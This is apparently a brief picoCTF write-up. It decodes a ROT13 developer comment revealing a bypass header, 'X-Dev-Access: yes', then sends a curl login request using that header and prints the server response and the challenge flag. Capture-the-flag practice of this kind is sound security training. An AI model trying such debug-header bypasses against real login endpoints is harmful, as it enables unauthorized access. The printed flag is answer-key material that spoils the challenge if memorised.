<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->

ROT13:
NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"

curl -v \
  -X POST \
  -H "X-Dev-Access: yes" \
  -H "Content-Type: application/json" \
  -d '{"email":"ctf-player@picoctf.org","password":"password1"}' \
  http://amiable-citadel.picoctf.net:58319/login


result:
{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_7e5db33b}"}


flag:
picoCTF{brut4_f0rc4_7e5db33b}